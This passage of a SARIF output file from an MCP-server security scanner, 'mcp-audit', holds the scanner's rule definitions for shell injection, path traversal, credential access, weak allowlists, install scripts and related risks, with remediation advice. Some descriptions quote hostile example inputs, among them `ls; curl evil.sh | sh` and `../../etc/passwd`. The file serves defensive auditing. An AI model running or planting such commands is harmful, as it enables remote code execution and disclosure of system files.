{
  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "mcp-audit",
          "version": "0.5.3",
          "informationUri": "https://github.com/cheappicklecodes/mcp-audit",
          "rules": [
            {
              "id": "shell-injection",
              "name": "Caller-controlled string reaches a shell",
              "shortDescription": {
                "text": "Caller-controlled string reaches a shell"
              },
              "fullDescription": {
                "text": "The shell parses the string, so everything in it is syntax: `;`, `&&`, `$()` and backticks all run. When the caller writes that string, the caller is writing code, and the tool description is the only boundary."
              },
              "help": {
                "text": "Either validate against an allowlist that matches the whole command and fails closed, or move to `execFile` with an argv array so nothing is parsed."
              },
              "defaultConfiguration": {
                "level": "error"
              }
            },
            {
              "id": "reads-credentials",
              "name": "Reads credential or key material",
              "shortDescription": {
                "text": "Reads credential or key material"
              },
              "fullDescription": {
                "text": "Reading your private keys and cloud config means a bug in this server is a bug in everything you are logged into. Most servers need one secret and touch ten."
              },
              "help": {
                "text": "Pass the single secret the server needs instead of letting it crawl config directories."
              },
              "defaultConfiguration": {
                "level": "error"
              }
            },
            {
              "id": "shell-exec",
              "name": "Executes shell commands",
              "shortDescription": {
                "text": "Executes shell commands"
              },
              "fullDescription": {
                "text": "Shell access turns a data source into an actor. Once the model can pass a string to a shell, argument injection becomes command injection and the tool description becomes the trust boundary."
              },
              "help": {
                "text": "Use an allowlist, avoid `shell: true`, and quote interpolated values."
              },
              "defaultConfiguration": {
                "level": "error"
              }
            },
            {
              "id": "path-traversal",
              "name": "Joins caller-supplied paths without a containment check",
              "shortDescription": {
                "text": "Joins caller-supplied paths without a containment check"
              },
              "fullDescription": {
                "text": "`path.join(ROOT, args.path)` looks confined but is not: `../../etc/passwd` walks straight out of ROOT, and an absolute segment discards the prefix entirely. The model writes that string, and so does anything else that can call the tool."
              },
              "help": {
                "text": "Resolve, then compare with a separator: `const p = path.resolve(ROOT, input); if (!p.startsWith(ROOT + path.sep)) throw`. On Windows use `path.relative` and reject a leading `..`."
              },
              "defaultConfiguration": {
                "level": "error"
              }
            },
            {
              "id": "remote-no-auth",
              "name": "HTTP server bound without obvious auth",
              "shortDescription": {
                "text": "HTTP server bound without obvious auth"
              },
              "fullDescription": {
                "text": "An MCP server speaking HTTP with tools attached and no token check is an unauthenticated API into your filesystem or accounts for anything on the network."
              },
              "help": {
                "text": "Require a bearer token; bind to localhost when the server is local-only."
              },
              "defaultConfiguration": {
                "level": "error"
              }
            },
            {
              "id": "weak-allowlist",
              "name": "Command allowlist can be bypassed",
              "shortDescription": {
                "text": "Command allowlist can be bypassed"
              },
              "fullDescription": {
                "text": "An allowlist is only a boundary if it matches the whole command. Unanchored patterns and greedy `.*` let `ls; curl evil.sh | sh` through a rule meant to permit `ls`."
              },
              "help": {
                "text": "Anchor patterns (`^…$`), and check for shell metacharacters separately."
              },
              "defaultConfiguration": {
                "level": "error"
              }
            },
            {
              "id": "broad-fs-access",
              "name": "Server can reach the whole filesystem or home directory",
              "shortDescription": {
                "text": "Server can reach the whole filesystem or home directory"
              },
              "fullDescription": {
                "text": "A server scoped to a project can be compromised for the cost of the project. One scoped to `~` or `/` can read every repo, key and note on the machine — including files it never advertised."
              },
              "help": {
                "text": "Scope roots to the directories the server actually serves."
              },
              "defaultConfiguration": {
                "level": "error"
              }
            },
            {
              "id": "unpinned-dependency",
              "name": "Dependency ranges that can float",
              "shortDescription": {
                "text": "Dependency ranges that can float"
              },
              "fullDescription": {
                "text": "A caret or star range means today’s install and tomorrow’s install can be different code. For a component that holds credentials and runs commands, that is unearned trust."
              },
              "help": {
                "text": "Pin exact versions, or at minimum commit a lockfile and install with `npm ci`."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "write-capability",
              "name": "Can write or mutate files and state",
              "shortDescription": {
                "text": "Can write or mutate files and state"
              },
              "fullDescription": {
                "text": "Read-plus-write is where mistakes become damage. Note whether writes are confined and whether they are reversible."
              },
              "help": {
                "text": "Confine write roots, and prefer explicit overwrite semantics over silent replace."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "object-merge",
              "name": "Merges caller-supplied objects",
              "shortDescription": {
                "text": "Merges caller-supplied objects"
              },
              "fullDescription": {
                "text": "Naive `Object.assign`/spread merging lets `__proto__` in tool arguments reach the prototype chain."
              },
              "help": {
                "text": "Filter `__proto__`, or use a merge that blocks it."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "hidden-unicode",
              "name": "Invisible or reordered unicode inside metadata",
              "shortDescription": {
                "text": "Invisible or reordered unicode inside metadata"
              },
              "fullDescription": {
                "text": "Zero-width and bidi characters render as nothing but survive into the model context. They are used to hide instructions from human review and to make identifiers look identical to trusted ones."
              },
              "help": {
                "text": "Strip or normalize them; check strings byte-for-byte rather than by eye."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "outbound-network",
              "name": "Makes outbound network calls",
              "shortDescription": {
                "text": "Makes outbound network calls"
              },
              "fullDescription": {
                "text": "An MCP server with data access and an outbound socket can ship that data anywhere. Worth knowing which endpoints, and whether a local-first tool is quietly phoning home."
              },
              "help": {
                "text": "Confirm the endpoint. For privacy-sensitive servers prefer opt-out telemetry or none."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "hardcoded-credential-default",
              "name": "Credential falls back to a baked-in default",
              "shortDescription": {
                "text": "Credential falls back to a baked-in default"
              },
              "fullDescription": {
                "text": "`process.env.TOKEN || \"abc123\"` means the server works without configuration, which hides that it is running on a shared or demo credential."
              },
              "help": {
                "text": "Document the default, or fail loudly when the variable is missing."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "dynamic-eval",
              "name": "Evaluates dynamic code",
              "shortDescription": {
                "text": "Evaluates dynamic code"
              },
              "fullDescription": {
                "text": "`eval`, `new Function` and `pickle.loads` execute data as code. Whatever supplies the data supplies the code."
              },
              "help": {
                "text": "Prefer parsing over evaluation; for pickle, note that it is not safe on untrusted input."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "public-bind",
              "name": "Listens on all interfaces",
              "shortDescription": {
                "text": "Listens on all interfaces"
              },
              "fullDescription": {
                "text": "`0.0.0.0` exposes the port to the LAN and any container network, not just this machine."
              },
              "help": {
                "text": "Bind `127.0.0.1` unless remote access is the point."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "transient-host",
              "name": "Talks to a transient or free-hosting endpoint",
              "shortDescription": {
                "text": "Talks to a transient or free-hosting endpoint"
              },
              "fullDescription": {
                "text": "Tunnels, pastes and run-as-a-service hosts change owners and content. A tool that pulls payloads from one is only as trustworthy as a URL nobody pinned."
              },
              "help": {
                "text": "Prefer static delivery (tagged release, raw file at a commit SHA) over dynamic endpoints."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "install-script",
              "name": "Package runs code at install time",
              "shortDescription": {
                "text": "Package runs code at install time"
              },
              "fullDescription": {
                "text": "preinstall/install/postinstall executes before you have run anything, with your user permissions. This is the standard vector for a compromised dependency."
              },
              "help": {
                "text": "Read the script. Pin the version and check it has no network access."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "capability-mismatch",
              "name": "Capability declaration does not match what the server serves",
              "shortDescription": {
                "text": "Capability declaration does not match what the server serves"
              },
              "fullDescription": {
                "text": "The capabilities block is the contract the host negotiates with. Declaring `tools: {}` and then answering `tools/list` means the client never agreed to tools, so list-change notifications go nowhere and some hosts keep a stale catalog. The reverse — advertising tools with no `tools/call` handler — gives the model a catalog it cannot invoke."
              },
              "help": {
                "text": "Declare what the server really serves: `capabilities: { tools: { listChanged: true } }`, and implement every tool listed."
              },
              "defaultConfiguration": {
                "level": "warning"
              }
            },
            {
              "id": "telemetry",
              "name": "Analytics or telemetry SDK present",
              "shortDescription": {
                "text": "Analytics or telemetry SDK present"
              },
              "fullDescription": {
                "text": "Telemetry decides what leaves the machine before you have asked the tool anything."
              },
              "help": {
                "text": "Look for a documented off switch and confirm the endpoint."
              },
              "defaultConfiguration": {
                "level": "note"
              }
            },
            {
              "id": "transport",
              "name": "Uses stdio transport",
              "shortDescription": {
                "text": "Uses stdio transport"
              },
              "fullDescription": {
                "text": "Local stdio servers inherit your user account. There is no sandbox between the server and your files."
              },
              "help": {
                "text": "Prefer stdio for local work and HTTP with auth for remote."
              },
              "defaultConfiguration": {
                "level": "note"
              }
            }
          ]
        }
      },
